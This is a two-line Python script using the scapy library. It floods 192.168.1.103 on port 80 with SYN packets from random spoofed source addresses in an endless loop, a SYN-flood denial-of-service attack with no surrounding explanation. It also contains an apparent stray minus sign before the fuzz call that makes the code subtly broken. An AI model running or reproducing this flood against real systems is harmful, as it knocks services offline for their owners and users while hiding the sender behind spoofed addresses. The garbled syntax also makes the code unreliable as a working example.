from scapy.all import *
send(IP(src=RandIP(),dst='192.168.1.103')/-fuzz(TCP(dport=80,flags=0x002)),loop=1)